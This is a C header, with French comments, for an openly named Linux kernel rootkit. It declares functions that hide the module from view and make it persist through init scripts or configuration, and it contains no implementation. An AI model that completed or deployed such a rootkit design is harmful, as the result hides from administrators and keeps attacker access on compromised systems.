#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/module.h>

/* Fonctions pour masquer et afficher le module */

/**
 * @brief Initialise les fonctions de masquage pour un module.
 * 
 * @param mod Le module à masquer.
 * @return 0 en cas de succès, une valeur négative en cas d'erreur.
 */
int hide_init(struct module *mod);

/**
 * @brief Masque ou affiche un module.
 * 
 * @param mod Le module à masquer ou afficher.
 * @param hide Si 1, masque le module. Si 0, le rend visible.
 */
void hide(struct module *mod, int hide);

/**
 * @brief Nettoie les modifications liées au masquage du module.
 */
void hide_exit(void);

/* Fonctions pour la persistance */

/**
 * @brief Écrit une chaîne de caractères dans un fichier.
 * 
 * @param path Le chemin du fichier.
 * @param data La chaîne de caractères à écrire dans le fichier.
 * @return 0 en cas de succès, une valeur négative en cas d'échec.
 */
int write_to_file(const char *path, const char *data);

/**
 * @brief Active la persistance du module via des scripts d'init ou des configurations spécifiques.
 * 
 * @param module_name Le nom du module pour la persistance.
 * @return 0 en cas de succès, une valeur négative en cas d'erreur.
 */
int enable_persistence(const char *module_name);

#endif /* ROOTKIT_H */
